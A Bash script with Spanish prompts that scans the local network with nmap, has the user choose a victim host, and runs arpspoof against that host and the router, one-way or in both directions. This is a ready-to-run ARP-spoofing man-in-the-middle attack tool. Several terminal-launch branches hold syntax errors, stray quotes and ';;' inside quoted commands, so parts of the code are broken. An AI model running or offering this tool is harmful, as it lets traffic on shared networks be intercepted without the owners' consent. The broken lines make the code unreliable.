#!/usr/bin/env bash
set -euo pipefail

trap ctrl_c INT

ctrl_c() {
    echo
    echo "Saliendo..."
    exit 1
}

ip="$(hostname -I | awk '{print $1}')"
echo "dependencias necesarias: (nmap y dsniff) si no lo tienes instalado, instálalo con: sudo apt install nmap dsniff"
echo "Se escaneará por defecto en /24."
while true; do
    read -p "¿Desea ese rango? (s/n): " respuesta_rango
    respuesta_rango="${respuesta_rango,,}"
    if [[ $respuesta_rango == "s" ]]; then
        rango="${ip%.*}.0/24"
        break
    elif [[ $respuesta_rango == "n" ]]; then
        while true; do
            read -p "Ingrese el prefijo CIDR deseado (0-32, por ejemplo 24): " rango_deseado
            if [[ $rango_deseado =~ ^([0-9]|[12][0-9]|3[0-2])$ ]]; then
                rango="${ip%.*}.0/${rango_deseado}"
                break
            else
                echo "Prefijo inválido. Debe ser un número entre 0 y 32."
            fi
        done
        break
    else
        echo "Respuesta no válida."
    fi
done
echo -e "\e[31mcuando termine de escanear presione ENTER...\e[0m"
echo "Escaneando en el rango: $rango"
sudo nmap -sn "$rango"
read -p ""
read -p "que dispositivo desea atacar (ingrese el host ID de la ip): " host_id
ip_objetivo="${ip%.*}.$host_id"
echo "el objetivo sera: $ip_objetivo"
interfaz_red_defecto=$(ip -o addr show | grep "$ip" | awk '{print $2}')
read -p "ingrese la interfaz de red a usar  (1-por defecto en tu sistema:$interfaz_red_defecto/2-manual) (1-2)" pregunta_interfaz
    if [[ $pregunta_interfaz == "1" ]]; then
        interfaz_red="$interfaz_red_defecto"
    elif [[ $pregunta_interfaz == "2" ]]; then
        read -p "ingrese la interfaz de red a usar (ejemplo: eth0, wlan0): " interfaz_red
    else
        echo "Opción no válida. Usando la interfaz por defecto: $interfaz_red_defecto"
        interfaz_red="$interfaz_red_defecto"
    fi
router="${ip%.*}.1"
echo "como desea el ataque:"
echo "1- unidireccional (ataque en la comunicacion entre la victima y el router)"
echo "2- bidireccional (ataque en la comunicacion entre la victima y el router y biceversa al mismo tiempo, se habriran dos terminales para pararlo presione CTRL+C en ambas)"
read -p ":" direcciones
if [[ $direcciones == "1" ]]; then
    echo "Iniciando ataque unidireccional..."
    sudo arpspoof -i $interfaz_red -t $ip_objetivo $router
elif [[ $direcciones == "2" ]]; then
    echo "¿cual es su interfaz grafica?"
    echo "1- GNOME"
    echo "2- XFCE"
    echo "3- KDE"
    echo "4- MATE"
    echo "5- LXDE"
    echo "6- LXqt"
    echo "7- Terminator"
    echo "8- Deepin Terminal"
    echo "9- Otro / Ninguno"
    read -p ":" interfaz_grafica
    inverso="sudo arpspoof -i $interfaz_red -t $router $ip_objetivo"
    directo="sudo arpspoof -i $interfaz_red -t $ip_objetivo $router"
    if [[ $interfaz_grafica == "1" ]]; then
        echo "Iniciando ataque bidireccional..."
        gnome-terminal -- bash -c "$inverso; exec bash"" &
        $directo
    elif [[ $interfaz_grafica == "2" ]]; then
        echo "Iniciando ataque bidireccional..."
        xfce4-terminal --command "bash -c '$inverso; exec bash'"" &
        $directo
    elif [[ $interfaz_grafica == "3" ]]; then
        echo "Iniciando ataque bidireccional..."
        konsole -e bash -c "$inverso; exec bash" &
        $directo
    elif [[ $interfaz_grafica == "4" ]]; then
        echo "Iniciando ataque bidireccional..."
        mate-terminal -- bash -c "$inverso; exec bash" &
        $directo
    elif [[ $interfaz_grafica == "5" ]]; then
        echo "Iniciando ataque bidireccional..."
        lxterminal -e "bash -c '$inverso;; exec bash'" &
        $directo
    elif [[ $interfaz_grafica == "6" ]]; then
        echo "Iniciando ataque bidireccional..."
        qterminal -e "bash -c '$inverso;; exec bash'" &
        $directo
    elif [[ $interfaz_grafica == "7" ]]; then
        echo "Iniciando ataque bidireccional..."
        terminator -x bash -c "$inverso;; exec bash" &
        $directo
    elif [[ $interfaz_grafica == "8" ]]; then
        echo "Iniciando ataque bidireccional..."
        deepin-terminal -e "bash -c '$inverso;; exec bash'" &
        $directo
    elif [[ $interfaz_grafica == "9" ]]; then
        echo "Por favor, si tiene interfaz grafica abra una nueva terminal y ejecute el siguiente comando:"
        echo "$inverso"
        echo "Presione ENTER para continuar con el ataque directo..."
        read -p ""
        $directo
    else
        echo "Opción no válida. Saliendo."
        exit 1
    fi
else
    echo "Opción no válida. Saliendo."
    exit 1
fi
